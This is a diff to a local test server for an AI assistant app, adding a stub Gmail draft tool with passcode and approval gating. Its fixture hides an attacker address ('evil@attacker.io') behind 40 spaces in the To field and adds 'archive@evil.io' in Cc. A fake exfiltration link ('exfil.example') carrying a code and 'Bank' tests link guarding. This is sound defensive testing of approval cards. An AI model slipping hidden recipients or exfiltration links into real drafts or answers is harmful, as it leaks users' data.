@@ -20,8 +20,13 @@ const mime = { '.html': 'text/html', '.css': 'text/css', '.js': 'text/javascript
 // so does every Claude request the Worker adapter sends on (model, max_tokens, effort), to check the output budgets.
 // REVIEW_PROVIDERS=1 (or --providers) reports Anthropic, OpenAI, Gemini, Runway and xAI as configured for the owner too (Video mode's
 // Omni, Runway and Grok menus, Settings → models and voices); their /api/omni, /api/runway, /api/xai and /api/tts calls get local stubs below.
-// It also connects a stub Gmail with one read-only tool (gmail_search): an inbox question goes to the accounts agent, whose
-// /api/chat turn calls that tool once, so its approval cards can be checked. No Gmail is ever read.
+// It also connects a stub Gmail with two tools, gmail_search (a read) and gmail_draft (a write, so it asks first). An inbox
+// question goes to the accounts agent, whose /api/chat turn calls gmail_search once, so its approval cards can be checked.
+//   "draft fixture"  the agent calls gmail_draft instead, with a To padded by 40 spaces and a Cc of two addresses, to
+//                    check that the draft card shows every recipient on a phone. The prompt also needs a word that sends
+//                    it to the agent: "email draft fixture". The fixture lists no mailbox, so the card can't name one.
+//                    The stub saves nothing unless approved, and prints the To and Cc it got.
+// No Gmail is ever read or written.
 // Both run the real src/sync.js over separate account buckets in memory (tests/fake-r2.mjs), shared by every browser
 // profile on this port; restarting empties them. workerRequest gives a body with a Content-Length the known length the
 // Workers runtime would (the strict fake, like R2, refuses a stream without one).
@@ -162,12 +167,17 @@ if (Boolean(process.env.REVIEW_PROVIDERS) || process.argv.includes('--providers'
     return new URL(href).hostname === 'api.anthropic.com' ? claudeStandIn(input instanceof Request ? input : new Request(href, init)) : passFetch(input, init);
   };
 }
-// The stub Gmail tool --providers connects (the Worker's real tool list is far longer; this one is read-only).
+// The stub Gmail tools --providers connects (the Worker's real tool list is far longer), flagged as src/tools.js toolList
+// flags them: x-write, x-label, x-service.
 // The stub Gmail result's link (copied into an answer it opens as before), and the made-up exfiltration link the agent's
 // "digest link" answer writes itself (it asks first: app.js guardLinks). Nothing is ever fetched from either.
 const FIXTURE_MAIL_LINK = 'https://mail.google.com/mail/u/0/#inbox/fixture1';
 const FIXTURE_EXFIL_LINK = 'https://exfil.example/d?c=482913&s=Bank';
 const FIXTURE_GMAIL ={ type: 'function', function: { name: 'gmail_search', description: 'Search the user’s Gmail (local fixture).', parameters: { type: 'object', properties: { q: { type: 'string', description: 'Gmail search query' } }, required: ['q'], additionalProperties: false } }, 'x-write': false, 'x-label': 'Search Gmail', 'x-service': 'gmail' };
+const FIXTURE_DRAFT = { type: 'function', function: { name: 'gmail_draft', description: 'Save an email as a draft in Gmail (local fixture; does not send). [needs the user\'s approval]', parameters: { type: 'object', properties: { account: { type: 'string', description: 'Which connected Gmail address to use' }, to: { type: 'string', description: 'Recipient(s)' }, cc: { type: 'string', description: 'Cc (optional)' }, subject: { type: 'string', description: 'Subject' }, body: { type: 'string', description: 'Plain-text body' } }, required: ['to', 'subject', 'body'], additionalProperties: false } }, 'x-write': true, 'x-label': 'Save Gmail draft', 'x-service': 'gmail' };
+// "draft fixture": a To whose second address sits past 40 spaces (an input on a phone showed only the first) and a Cc
+// with a name, both made up.
+const FIXTURE_DRAFT_ARGS = { to: `alex@company.com${' '.repeat(40)},evil@attacker.io`, cc: 'Alex Johnson <alex.johnson@companyname.com>, archive@evil.io', subject: 'Q3 numbers (local fixture)', body: 'Hi Alex,\n\nHere are the Q3 numbers. This is a local fixture, so nothing is sent.\n\nCole' };
 // Boot watchdog checks (public/index.html #bootWatch). REVIEW_BREAK=<mode> serves a deliberately broken start; or open
 // /__review/break?mode=<mode> in a browser, which sets a cookie for that browser only and opens / (mode=off clears it,
 // and wins over REVIEW_BREAK; anything else is off too). Only this fixture can break the app: public/ and src/ have no
@@ -402,10 +412,17 @@ createServer(async (req, res) => {
       if (identity.role !== 'owner') { res.statusCode = 403; return res.end('{"error":"Use the local owner passcode."}'); }
       return res.end('{}');
     }
-    if (url.pathname === '/api/tools') return res.end(allProviders ? JSON.stringify({ services: { gmail: true }, list: [FIXTURE_GMAIL] }) : '{"services":{},"list":[]}');
+    if (url.pathname === '/api/tools') return res.end(allProviders ? JSON.stringify({ services: { gmail: true }, list: [FIXTURE_GMAIL, FIXTURE_DRAFT] }) : '{"services":{},"list":[]}');
     if (url.pathname === '/api/tools/run' && req.method === 'POST' && allProviders) {
       const parts = []; for await (const p of req) parts.push(p);
       let b = {}; try { b = JSON.parse(Buffer.concat(parts).toString()); } catch {}
+      // gmail_draft, as the Worker runs a write: the passcode, then approved === true, or nothing is saved (src/tools.js runTool)
+      if (b.name === 'gmail_draft') {
+        if (identity.role !== 'owner') { res.statusCode = 401; return res.end('{"error":"Connected accounts need the server passcode."}'); }
+        if (b.approved !== true) return res.end(JSON.stringify({ ok: false, error: 'This action needs the user\'s approval in the app.' }));
+        console.log('gmail_draft (fixture, nothing saved)', JSON.stringify({ to: b.args?.to ?? null, cc: b.args?.cc ?? null }));
+        return res.end(JSON.stringify({ ok: true, result: { saved: true, draftId: 'fixture' } }));
+      }
       if (b.name !== 'gmail_search') { res.statusCode = 400; return res.end('{"error":"Unknown fixture tool."}'); }
       return res.end(JSON.stringify({ ok: true, result: { messages: [{ from: 'Fixture Sender', subject: 'Local fixture — no Gmail was read', snippet: 'Two unread messages, both made up.', link: FIXTURE_MAIL_LINK }] } }));
     }
@@ -534,11 +551,19 @@ createServer(async (req, res) => {
         return writeResponse(res, await claudeChat(body, 'review-fixture-key'));
       }
       // --providers: the accounts agent (a request offering gmail_search) calls it once for an inbox question, then answers
-      // from the fixture result (or says it was declined).
+      // from the fixture result (or says it was declined). "draft fixture" calls gmail_draft instead.
       if (allProviders && Array.isArray(body.tools) && body.tools.some((t) => t?.function?.name === 'gmail_search')) {
         const lastMsg = body.messages?.at(-1) || {};
         const sse = (o) => res.write(`data: ${JSON.stringify(o)}\n\n`);
         res.setHeader('Content-Type', 'text/event-stream');
+        if (/draft fixture/i.test(promptOf(body.messages))) {
+          const said = String(lastMsg.content ?? '');
+          if (lastMsg.role === 'user') {
+            sse({ choices: [{ delta: { tool_calls: [{ index: 0, id: 'call_fixture_draft', type: 'function', function: { name: 'gmail_draft', arguments: JSON.stringify(FIXTURE_DRAFT_ARGS) } }] } }] });
+            sse({ choices: [{ delta: {}, finish_reason: 'tool_calls' }] });
+          } else sse({ choices: [{ delta: { content: lastMsg.role !== 'tool' ? 'Local fixture answer from the accounts agent. No provider was called.' : /"draftId"/.test(said) ? 'Draft saved. (Local fixture: nothing reached Gmail.)' : /declined/.test(said) ? 'OK, no draft saved. (Local fixture.)' : 'The draft wasn’t saved. (Local fixture.)' } }] });
+          return res.end('data: [DONE]\n\n');
+        }
         if (lastMsg.role === 'user' && /\b(inbox|e-?mails?|gmail|unread)\b/i.test(JSON.stringify(lastMsg.content ?? ''))) {
           sse({ choices: [{ delta: { tool_calls: [{ index: 0, id: 'call_fixture_1', type: 'function', function: { name: 'gmail_search', arguments: JSON.stringify({ q: 'is:unread newer_than:2d' }) } }] } }] });
           sse({ choices: [{ delta: {}, finish_reason: 'tool_calls' }] });
